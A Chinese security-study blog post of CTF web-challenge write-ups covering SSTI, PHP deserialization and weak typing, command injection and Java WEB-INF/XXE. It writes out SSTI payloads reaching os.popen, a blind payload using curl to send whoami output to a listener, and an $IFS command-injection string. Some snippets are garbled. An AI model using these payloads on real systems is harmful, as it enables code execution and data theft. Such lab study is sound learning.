# XD安全 学习笔记 | CTF夺旗

[mp.weixin.qq.com](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484705&idx=2&sn=2e7501824da039a30b95c364719f723f&chksm=cfd87adef8aff3c8db20ced2e584af34f1c1dc7354a3f24ac239c5763e47c13b2e22fafa7499&mpshare=1&scene=1&srcid=0804EwyAI9PGDNbBwRpEgrTI&sharer_sharetime=1659545594716&sharer_shareid=c75c93b84e50ea6bcab5077411998942#rd)凯 0x00实验室

声明

作者：团队成员-凯【无名安全团队】

如需转载文章，请标明来源即可。-

day83-85天学习笔记-

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDa00ejF45UXkLggfZTK8TEwTnSaicIyH2W4UIXTR3XbwN5icbPlcUS49w%2F640%3Fwx_fmt%3Dpng)

序列化：

序列化是将对象的状态信息转换为可以存储或传输的形式的过程。

靶场:

华北赛区Day1 Web2 Writeup

开启靶机

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDKOetbm94WN3BfT4RfpGxATxKqXceAmfdtiaCb0Mic6xdCRgaKcFXQB1w%2F640%3Fwx_fmt%3Dpng)

看到提示找到v6，使用脚本

    import requests 

发现在181页

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zD8PibywicJF4cicChvMbwAhJbjbykia06Tic4v0ZlYaGAjIMvrlVPoIKQ2mQ%2F640%3Fwx_fmt%3Dpng)

购买商品发现钱数不够，但在前端页面可以更改折扣卷

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDEbxqKFCYavFde9DQG1oxjhjdrVT01LJ9a9dlszlHiaM8WFfInLnFcnQ%2F640%3Fwx_fmt%3Dpng)

操作完成后提示

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDPZdib4OjBFh9ziaXRicUH9c8TCzicfXbapic7NzDCaS2elricV8un2qCibkicQ%2F640%3Fwx_fmt%3Dpng)

抓包发现wtf

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDiah8qzWjFCIJ0SUGAWc23HshS7It7mkjMQsT7m6iaPT1EEiaibL1TXZmCw%2F640%3Fwx_fmt%3Dpng)

跑出来的密钥”1kun“

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zD9THtEFL0ScJZjKP9E9ibkoriaz3uCzLv63diarJjicoQBJrt7AlngfKF9g%2F640%3Fwx_fmt%3Dpng)

cookie伪造成功

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDIn6vicRqClxDQDhukeVjdsaF354Jxuvagwfomk0lmibMIvty2jnB2NmA%2F640%3Fwx_fmt%3Dpng)

查看页面源代码发现有一个文件，进行下载，发现代码中有序列化构造payload

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDPbLYLqYKib12963Wib5Edibcw7DuQrc78goDgJCQ4MJ4Dvl9QOO2UWHyA%2F640%3Fwx_fmt%3Dpng)

查看你刚才那个页面，将输入框的 hidden 属性删掉，将 payload 粘进去提交。flag成功显示-

SSTI:

SSTI(Server-Side Template Injection) 服务端模板注入，就是服务器模板中拼接了恶意用户输入导致各种漏洞。

1.ssti漏洞的检测

比如发送{{7\*7}}返回49

2.漏洞利用

通过某种类型(字符串:""，list:\[\]，int：

1)开始引出，class找到当前类，mro或者base找到object，前边的语句构造都是要找这个。然后利用object找到能利用的类。

config.items()可以查看服务器的配置信息

class返回调用参数类型

base返回基类

mro 返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序。

subclasses()对每个new-style class“为它的直接子类维持一个弱引用列表”，之后“返回一个包含所有存活引用的列表” ，返回子类''.

class.mro\[2\] <class ‘object’>''.

class.mro\[2\].subclasses() 查看所有模块''.

class.mro\[2\].subclasses()\[71\].init.globals来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数

靶场:\[WesternCTF2018\]shrine 1

启动靶场

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDW8erg4rIJ7zshhEAibiaLaoGbe9o418cB9aNAQNfick2tr0WuJOvYltYA%2F640%3Fwx_fmt%3Dpng)

使用tplmap工具发现有过滤

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDib6UVenGqs6jKUdNDgywKYoKLmrfqque8iaicYDLAr9p8XE11p5wfk1nw%2F640%3Fwx_fmt%3Dpng)

查看源代码是对()进行了过滤，这使得很多语句无法使用，使用url\_for()绕过

    http://d8e25c11-b61d-47c0-b8b5-1078aa2e2283.node4.buuoj.cn:81/shrine/%7B%7Burl_for._globals_%7D%7D

绕过绕过中括号

#通过\_\_bases\_\_.\_\_getitem\_\_(0)（\_\_subclasses\_\_().\_\_getitem\_\_(128)）绕过\_\_bases\_\_\[0\] （\_\_subclasses\_\_()\[128\]） #通过\_\_subclasses\_\_().pop(128)绕过\_\_bases\_\_\[0\]（\_\_subclasses\_\_()\[128\]） "".\_\_class\_\_.\_\_bases\_\_.\_\_getitem\_\_(0).\_\_subclasses\_\_().pop(128).\_\_init\_\_.\_\_globa ls\_\_.popen('whoami').read()

{% set chr= ().\_\_class\_\_.\_\_bases\_\_.\_\_getitem\_\_(0).\_\_subclasses\_\_().\_\_getitem\_\_(250).\_\_init\_\_ .\_\_globals\_\_.\_\_builtins\_\_.chr %}{{().\_\_class\_\_.\_\_bases\_\_\[0\].\_\_subclasses\_\_() \[250\].\_\_init\_\_.\_\_globals\_\_.os.popen(chr(119)%2bchr(104)%2bchr(111)%2bchr(97)%2bc hr(109)%2bchr(105)).read()}}

绕过中括号+逗号

绕过双大括号

{% if ''.\_\_class\_\_.\_\_bases\_\_.\_\_getitem\_\_(0).\_\_subclasses\_\_().pop(250).\_\_init\_\_.\_\_globa ls\_\_.os.popen('curl http://127.0.0.1:7999/?i=\`whoami\`').read()=='p' %}1{% endif %}

python2下的盲注

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibVXD3ULCk234YXWEz0P9zDmNjNxSZENzhVULicy8bSxD0ntSdYg7ZiaDWKLTNbFPsywQQXsYoicHCoQ%2F640%3Fwx_fmt%3Dpng)

Python Web之flask session

%操作符

    >>> name = 'Bob' 

第二种：string.Template

使用标准库中的模板字符串类进行字符串格式化。

    >>> name = 'Bob' 

第三种：调用format方法

python3后引入的新版格式化字符串写法，但是这种写法存在安全隐患。

存在安全隐患的事例代码：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkgh88L0UCmE1CPpJ6YicdInRIWTukAahiaVLK5pVVd6SMbbSiaR5KuMlnw%2F640%3Fwx_fmt%3Dpng)

从上面的例子中，我们可以发现：如果用来格式化的字符串可以被控制，攻击者就可以通过注入特殊变量，带出敏感数据。

第四种:f-Strings

这是python3.6之后新增的一种格式化字符串方式，其功能十分强大，可以执行字符串中包含的python表达式，安全隐患可想而知。

    >>> a , b = 5 , 10 

* * *

CTF\-php

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkGcX6lIDMM0jRfklfVknaXQuwNMVK2vAiagXvq7aAMg1LN00oCU0wnpg%2F640%3Fwx_fmt%3Dpng)

弱类型与强类型：

强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。我们称之为强类型，而弱类型可以随意转换变量的类型例如可以这样：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkCFGEiapRsMqn9THvFaSSiby5Jbibz2rndibIfibGfymAZBJnulBVR4ofvqA%2F640%3Fwx_fmt%3Dpng)

靶场：

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk2uvtGOgTdvqZEt0j1wOMcXXMuiaLMnhBqgBQwYO7cCJfictuECwM5tiaw%2F640%3Fwx_fmt%3Dpng)

通过代码分析发现只要num和1相等便可以得到

flag.http://123.206.87.240:8002/get/index1.php/?num=1x

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkibvXnic0yKc5mRFDLT0XjdOZicJ8UUA9N5amb4bQTUq66Jl69HjnVUjpA%2F640%3Fwx_fmt%3Dpng)

preg\_match绕过：

异或：在PHP中两个字符串异或之后，得到的还是一个字符串

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkxL5kjQkuYWIbKXfxJ6qxoZHQLeibnvWLDjSgDDaw25BJHyOfzK1GmJQ%2F640%3Fwx_fmt%3Dpng)

取反：将函数取反然后用url编码表示

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkwUMBp2EzhzaILkknVK6hlnicS5eyXBLg4OHoh7bGBa1w0aQnd4VqUgA%2F640%3Fwx_fmt%3Dpng)

数组：preg\_match只能处理字符串，当传入的subject是数组时会返回false

PCRE：

PHP利用PCRE回溯次数限制绕过某些安全限制给pcre设定了一个回溯次数上限，默认为1000000，如果回溯次数超过这个数字，preg\_match会返回false

换行符

靶场：hate\_php

根据代码我们可知已经对\\,",'等多种符号进行了过滤所以无法使用异或，同时get\_defined\_function对php里的一些函数也进行了过滤

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibknaN4ZjdQ7M1V9aYm8wRx1Q1qblreyn2ZaZxB1Tdx7KiaJ6N7osWJpqA%2F640%3Fwx_fmt%3Dpng)

对highlight\_file 和 flag.php取反并进行url编码

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkcOwpyl3u3QibQqqTzMNhgQKjtV14g09ic5EBfVicTkOmIoftAorSjKXBQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk2l5AEAZaRZQSU9Vror2rE9No2CibYXpkPrLxd5XnwrbEdG3fP0icGm8g%2F640%3Fwx_fmt%3Dpng)

RCE:

靶场：buuctf-ping ping ping

开启靶场后发现可以用系统命令去执行代码，并且用大小写测试发现是linux操作系统

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkRgxJUiagI2sY1qvia1nH03DZUmhdwmIknWDiaTUbUgBCVYW81ibK3V4qOQ%2F640%3Fwx_fmt%3Dpng)

对空格和flag.php都进行限制

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkWIyTTeammsMN7QsjdMt5FWiam850ryA6O97Cd74yOx9T6yFWM8STCPA%2F640%3Fwx_fmt%3Dpng)

/?ip=127.0.0.1;a=g;cat$IFS$2fla$a.php 内量拼接绕过

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkOM833Pibia5VOjq3Ftnj2zUKRdTupGfPXyxo0u2Cn7kYbdf2ZlASudYQ%2F640%3Fwx_fmt%3Dpng)

反序列化：靶场代码如下

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk27Ks6fvTyEnLtR22g6uwf64D6KLWtHiaibb25GWaPu1WtLnxP43KrZ8Q%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkeNjj3vxl0CNNWkTQAtxMSI03ibrmEibMrVFKT83vpFfR7f43moHptSBw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkyKJ3CGpZBiayTVFwMltdhibwspcHnHMSz6PLBVwiayuHjVBkXJS1hYGpA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkDKXDnJHiciaErr4Y2TEicZu2vBzxZib1d0vaibC1H8FzmkOtDMw8vMGJvQw%2F640%3Fwx_fmt%3Dpng)

利用php>7.1版本对类属性的检测不严格(对属性类型不敏感)

正常构造payload的话因为op、op、fliename、$content都是protected属性，序列化的的结果的属性名前面会有/00/00(或者%00%00)，/00的ascii为0不可见的字符如下图，就会被is\_valid方法拦下来。

可以将protected换为public传入str，经过处理反序列化。is\_valid过滤：传入的string要是可见字符ascii值为32-125。$op：op=="1"的时候会进入write方法处理，op=="2"的时候进入read方法处理。\===值相等，类型相等

构造payload:

class FileHandler {public op=" 2"pubilic fielname=flag.phppublic content}$A=NEW FileHandler$a=serialize($A)echo($a)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkyp5ibKUPalO39G8glgibiadTXTNovJ38nPCs08yvgCiarkpBnqdZ6ZcpKA%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkCZ6bSMuBAwxyNSqbMlEDuQCq3icvJnTF2SjjY1Ocj0wv15kKT9ib6jvQ%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkUvMicVIxAW5Qf9f1q8DRFcbjbVusr9yibyBxj0kP8S0flM2NE1xr9Hww%2F640%3Fwx_fmt%3Dpng)

* * *

CTF-java

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkafibnnZygdKQDqzdM0le1Bxn9A82zibavzIWn3pboL05yibh1SKCmbwvQ%2F640%3Fwx_fmt%3Dpng)

java常考以及出题思路：

xee,spl表达式，反序列化，文件安全，最新框架插件漏洞

必备知识点：

反编译，基础的Java代码认知以及审计能力，熟悉相关最新的漏洞，常见漏洞

java简单逆向解密靶场：

java逆向解密

开启之后下载文件，用idea打开

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkdhOCOEurSibHicvmstJyZYCYYbyHdoXva9sIW2ga7oGrDp41OaqyXdlg%2F640%3Fwx_fmt%3Dpng)

观察代码后发现可以逆向得到flag

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk6Ttg2pEPaVibRniaunALzR8jugQLoLcsbDHwNyz3TRfG3FiceE6SmofoQ%2F640%3Fwx_fmt%3Dpng)

编写脚本，成功得到flag

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkFjSVeL2b9dGpExBTq9eapAPuGZXyRP7S1KXvaIsVePI8eicWrEPLIPw%2F640%3Fwx_fmt%3Dpng)

web-INF

WEB-INF 主要包含一下文件或目录：

/WEB-INF/web.xml：Web 应用程序配置文件，描述servlet 和其他的应用组件配置及命名规则。

/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包 含在 .jar 文件中

/WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件,如数 据库驱动 jar 文件/WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件。

/WEB-INF/database.properties：数据库配置文件 漏洞检测以及利用方法：通过找到 web.xml 文件，推断 class 文件的路径，最后直接class 文件，在 通过反编译 class 文件，得到网站源码

靶场：

\[RoarCTF 2019\]Easy Java开启靶场时有页面有一个help,并且打开后url呈现filename=?,由此可知可能含有文件上传漏洞

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkmdL5xeSsfy53nFjfaD2oIiaXJgJ15ibm6a2ujdfhKZwiaDxEicSayzLTiaw%2F640%3Fwx_fmt%3Dpng)

以post的方式提交filename=/WEB-INF/web.xml

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkn20jWexxEZANoX5tLCHcdZRYcvmTR99KGsKXSNhEuLqLtRPwF8KEiaw%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibksIkeOJVib48pKOIHt4ibDpUE3wBCmYjyF8LZDVVn9doy7TiaPLufic1KEg%2F640%3Fwx_fmt%3Dpng)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkmeava002r6zKxPl3oeTLjzzSRJsqRkKpOMIFa8eXlrSSPvaa53e6Bg%2F640%3Fwx_fmt%3Dpng)

flag在

com/ctf/FlagControllerfilename=/WEB-INF/classes/com/wm/ctf/FlagController

在经过base64解密得到flag

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk40rreA7QlaW0GAicuUAIdJGegvjJtwsWq7WRmyzHDlM8TXNSpXiaac5Q%2F640%3Fwx_fmt%3Dpng)

配置源码

靶场：网鼎杯 2020-青龙组\-filejava-ctfhub上传图片抓包后发现有filename,

由此判断可能存在文件上传漏洞

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibk8eFwibk27PeRfS6rZ1boDuGVlwAbAJ64KnMEPSMgZA7iavAbn1MOdY2Q%2F640%3Fwx_fmt%3Dpng)

写入/WEB-INF/web.xml发现文件被删除，这里可能存在检测可以使用../绕过

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkHrCM9iazIZ8HiazOnWblTiaiclv2FSmqLaOcRHWJojx7IwvariaQSN6jkCA%2F640%3Fwx_fmt%3Dpng)

将存在的文件进行下载，代码审计 Javaweb 代码，发现 flag 位置，文件下载获取？过滤，利用漏洞xxe 安全，构造payload

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fmmbiz.qpic.cn%2Fmmbiz_png%2FcbYIBjX6JJibiaPycO1XfyibSWjXEhFNEibkdbxmCkZ4f5jJUibiatMFJTeuFKHyUQHFxWiaBgibAMqEdLQjL0bUBmJiaMA%2F640%3Fwx_fmt%3Dpng)

* * *

往期推荐

[

XD安全渗透 学习笔记 | XSS漏洞阶段



](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484465&idx=1&sn=194af7a720f11536bbdb1eee402e8187&chksm=cfd87bcef8aff2d851269d1de41fc0d0d8c6f7abf0c0c1b87ee8a0e399ec2943b6c54e77a6c3&scene=21#wechat_redirect)

[

XD安全渗透 学习笔记 | CSRF-SSRF阶段



](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484353&idx=1&sn=41ebcb2d6503d0a1cbf8ba59938db15f&chksm=cfd87c3ef8aff5285c0c6614a4be30c9f944d02ad32cfe150c5c52e6e81660518fa515532d5a&scene=21#wechat_redirect)

[

XD安全渗透测试课 学习笔记 | 内网渗透(四)



](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484318&idx=1&sn=206ece7fccf290a6c6fdcb5b6a999cea&chksm=cfd87c61f8aff577216c821de153e21567488b784d5e1283fedd6a860328166ecc6b37e27259&scene=21#wechat_redirect)

[

XD安全渗透测试课 学习笔记 | 内网渗透(三)



](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484247&idx=1&sn=abc131479e3df8a5389f97452d5e0241&chksm=cfd87ca8f8aff5be206c7f90aaef732828abafc98d840f90f9b31ba8e123cf3cc8091ea27cd2&scene=21#wechat_redirect)

[

XD安全渗透测试课程 学习笔记 | 内网渗透(二)



](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484112&idx=1&sn=036ffcfd03b4a4ee94f6f787cd7986a7&chksm=cfd87d2ff8aff439d9c2a89c2054b471a05c800e7a3d7ee605ef642b3321cab54b1423243454&scene=21#wechat_redirect)

[

XD安全渗透测试 学习笔记 | 内网渗透(一)



](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484046&idx=1&sn=85b730dafd28d0e798b8c70fe8130582&chksm=cfd87d71f8aff4672c1c0d254342b6e63f026b825be225e8af7fa30f364cf49bbdb384b42b0f&scene=21#wechat_redirect)

[查看原网页: mp.weixin.qq.com](http://mp.weixin.qq.com/s?__biz=Mzg5MDY2MTUyMA==&mid=2247484705&idx=2&sn=2e7501824da039a30b95c364719f723f&chksm=cfd87adef8aff3c8db20ced2e584af34f1c1dc7354a3f24ac239c5763e47c13b2e22fafa7499&mpshare=1&scene=1&srcid=0804EwyAI9PGDNbBwRpEgrTI&sharer_sharetime=1659545594716&sharer_shareid=c75c93b84e50ea6bcab5077411998942#rd)